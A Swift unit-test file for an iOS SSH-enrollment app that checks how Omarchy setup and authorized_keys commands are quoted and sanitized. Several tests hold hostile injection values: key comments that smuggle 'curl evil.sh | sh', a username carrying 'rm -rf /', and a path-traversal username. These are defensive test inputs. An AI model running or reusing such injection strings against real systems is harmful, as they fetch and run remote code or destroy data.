import XCTest

@testable import RemoteCraft

/// The enrollment command is pasted into a shell on someone else's machine, with sudo
/// behind it. It has to be exactly right, and it has to be impossible for a text field on
/// a phone to turn it into a second command.
final class EnrollmentCommandTests: XCTestCase {
    private let line = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGFSO8jsBtB5yb9TBe2PxsPPAusNWecJZrp+E9rth6qVu3/KLxOMEIOUUmcsTynO69LEupudKPWRJLpPgq88xCY= remote-craft@iphone"

    func testKeyCommandQuotesTheWholeLine() {
        XCTAssertEqual(Omarchy.enrollCommand(publicLine: line),
                       "omarchy-setup-security-sshd --key=\"\(line)\"")
    }

    /// A key with no line at all — an imported RSA key — still yields something runnable:
    /// the interactive form of the same script.
    func testMissingKeyFallsBackToTheInteractiveScript() {
        XCTAssertEqual(Omarchy.enrollCommand(publicLine: "   "), "omarchy-setup-security-sshd")
    }

    /// An imported key's comment is a name the user typed. A name with a `"` in it must
    /// not be able to close the quote and append a second command to a line that is
    /// about to be pasted into a root-capable shell on another machine.
    func testKeyCommandCannotBeEscapedByAKeyComment() {
        let hostile = "ssh-ed25519 AAAAC3Nz my\"; curl evil.sh | sh; echo \"key"

        let command = Omarchy.enrollCommand(publicLine: hostile)

        XCTAssertEqual(command,
                       "omarchy-setup-security-sshd --key=\"ssh-ed25519 AAAAC3Nz my; curl evil.sh | sh; echo key\"")
        XCTAssertEqual(command.filter { $0 == "\"" }.count, 2)
    }

    /// A username field that can carry a `;` is a username field that can carry a second
    /// command, and this one is pasted into a root-capable shell. The trailing fallback
    /// is what makes the line runnable on a released Omarchy, where `--gh-keys` does not
    /// exist yet and the bare script asks for the username instead.
    func testGitHubUsernameIsFilteredNotQuoted() {
        XCTAssertEqual(Omarchy.githubCommand(username: "octocat; rm -rf /"),
                       "omarchy-setup-security-sshd --gh-keys octocatrm-rf || omarchy-setup-security-sshd")
        XCTAssertEqual(Omarchy.githubUsername("  Octo-Cat  "), "Octo-Cat")
    }

    /// Signed in with no login yet: the flag has nothing to carry, so the command is the
    /// interactive script alone rather than a `--gh-keys` with an empty argument, which
    /// is an error on every Omarchy that has the flag and an unknown option on the rest.
    func testGitHubCommandWithoutAUsernameIsTheInteractiveScript() {
        XCTAssertEqual(Omarchy.githubCommand(username: "  "), "omarchy-setup-security-sshd")
    }

    /// The username is typed by hand on the paste route, and it lands in a URL as well
    /// as in a shell command. A name carrying a slash would point the "is my key there
    /// yet?" check at someone else's page entirely.
    func testGitHubKeysURLIsBuiltFromASanitizedUsername() {
        XCTAssertEqual(Omarchy.githubKeysURL(username: "Octo-Cat")?.absoluteString,
                       "https://github.com/Octo-Cat.keys")
        XCTAssertEqual(Omarchy.githubKeysURL(username: "octocat/../attacker")?.absoluteString,
                       "https://github.com/octocatattacker.keys")
        XCTAssertNil(Omarchy.githubKeysURL(username: "   "))
    }

    /// The second-device command runs over an SSH channel the app already has, so
    /// nobody will ever read it before it executes. Its two invariants — it cannot be
    /// escaped, and it cannot duplicate a line — have to be checked here instead.
    func testAuthorizeCommandIsIdempotentAndSingleQuoted() {
        let command = Omarchy.authorizeCommand(publicLine: line)

        // `-x` anchors the whole line, `-F` disables patterns: the base64 in a key is
        // full of `+` and `/` and must never be read as a regex.
        XCTAssertTrue(command.contains("grep -qxF '\(line)' ~/.ssh/authorized_keys || printf"))
        // sshd's StrictModes silently ignores a group-writable authorized_keys, so the
        // modes are set on every run, not only when the file is created.
        XCTAssertTrue(command.contains("install -d -m 700 ~/.ssh"))
        XCTAssertTrue(command.contains("chmod 600 ~/.ssh/authorized_keys"))
        XCTAssertTrue(command.hasSuffix("&& echo \(Omarchy.authorized)"))
    }

    /// An imported key's comment is user-typed text that ends up inside single quotes
    /// in a command executed on another machine. A `'` in it would close the quote.
    func testAuthorizeCommandCannotBeEscapedByAKeyComment() {
        let hostile = "ssh-ed25519 AAAAC3Nz my'; curl evil.sh | sh; echo '"

        let command = Omarchy.authorizeCommand(publicLine: hostile)

        XCTAssertFalse(command.contains("'; curl"))
        XCTAssertEqual(Omarchy.shellLiteral(hostile), "ssh-ed25519 AAAAC3Nz my; curl evil.sh | sh; echo")
    }

    /// An imported RSA key has no public line. There is nothing to append, and a
    /// command built from nothing would `grep` for the empty string — which matches
    /// every line in the file and reports success without writing anything.
    func testAuthorizeCommandRefusesABlankLine() {
        XCTAssertEqual(Omarchy.authorizeCommand(publicLine: "   \n "), "")
    }
}

/// The sentinel decides whether the app tells the user their key is on the box. Every
/// case below is output a real Omarchy box can produce on that same channel: sshd runs
/// an exec command through the login shell, and a themed `~/.bashrc` writes a screenful
/// before the first `grep` runs.
final class AuthorizeOutputTests: XCTestCase {
    func testSentinelIsAcceptedThroughShellNoise() {
        XCTAssertTrue(RemoteEnroll.read(output: Omarchy.authorized))
        XCTAssertTrue(RemoteEnroll.read(output: "omarchy 4.0.4\r\n\(Omarchy.authorized)\r\n"))
        XCTAssertTrue(RemoteEnroll.read(output: "  \(Omarchy.authorized)  \n"))
    }

    /// The word appears in this app's own text and in the command a shell may echo.
    /// A substring match here reports success for a key that never landed.
    func testSentinelIsNotMatchedInsideALine() {
        XCTAssertFalse(RemoteEnroll.read(output: "echo \(Omarchy.authorized)"))
        XCTAssertFalse(RemoteEnroll.read(output: "\(Omarchy.authorized)X"))
        XCTAssertFalse(RemoteEnroll.read(output: "running \(Omarchy.authorized) now"))
        XCTAssertFalse(RemoteEnroll.read(output: ""))
    }
}

/// The fingerprint is the only part of a key a person will ever compare by eye, so it has
/// to match what `ssh-keygen -l` prints for the same key, character for character.
final class FingerprintTests: XCTestCase {
    func testFingerprintMatchesSSHKeygen() {
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKvmFb2yt76bPHoXj+YC8d12XfXR9bx3mQP61RN82vcr vector"

        XCTAssertEqual(OpenSSHWire.fingerprint(ofPublicLine: line),
                       "SHA256:7OUCCteJ+DEL3EH/Mp6wpFZXcoub1BE2++HWHjUbTbU")
    }

    /// An imported RSA key has no public line, and inventing a fingerprint for it would
    /// be worse than admitting there is not one.
    func testUnparseableLineHasNoFingerprint() {
        XCTAssertNil(OpenSSHWire.fingerprint(ofPublicLine: ""))
        XCTAssertNil(OpenSSHWire.fingerprint(ofPublicLine: "ssh-ed25519"))
    }
}
